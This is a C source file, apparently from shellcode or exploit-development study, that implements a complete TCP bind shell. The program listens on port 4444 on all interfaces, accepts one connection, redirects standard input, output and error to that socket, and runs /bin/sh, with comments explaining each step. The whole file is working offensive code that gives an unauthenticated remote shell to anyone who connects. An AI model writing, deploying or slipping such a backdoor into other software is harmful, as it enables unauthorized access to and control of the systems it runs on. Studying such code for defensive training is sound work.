#include <sys/socket.h> // Contains Constant values used for Socket Creation
#include <sys/types.h>
#include <netinet/in.h> //Contains the Structure of Socket sockaddr_in
#include <stdlib.h>
#include <unistd.h>
 
int main()
{
 
         int rfd, sfd; // Result File Descriptor and Socket File Descriptor
         int port = 4444; // Bind Shell Port
         struct sockaddr_in my_addr; //Declaring my_addr as structure of type socket
 
         // Creating a socket - AF_INET defines domain i.e IPv4, SOCK_STREAM defines type i.e TCP and 0 represents default protocol
         sfd = socket(AF_INET, SOCK_STREAM, 0);
 
         int one = 1;
         // Defining additional socket options using setsockopt()
         // First argument takes the socket, SOL_SOCKET represent level on which these options are applied
         // Third argument SO_REUSEADDR tells to reuse the local address, fourth argument represents the value i.e True for 1
         // Fifth argument represents length of options
         setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
 
         // Defining Socket Structure values
         my_addr.sin_family = AF_INET;
         my_addr.sin_port = htons(port);
         my_addr.sin_addr.s_addr = INADDR_ANY;
 
         // Binding the created Socket
         bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
         // Allowing the socket to start listening for incoming connections
         listen(sfd, 0);
 
         // File descriptor to return on any incoming connection for further communicationm
         rfd = accept(sfd, NULL, NULL);
 
         // Redirecting the Input, Output and Error stream to the Result File Descriptor
         dup2(rfd, 2);
         dup2(rfd, 1);
         dup2(rfd, 0);
 
         // Executing /bin/sh using execve whose input/output will be channelised through the created socket
         execve("/bin/sh", NULL, NULL);
 
         return 0;
}
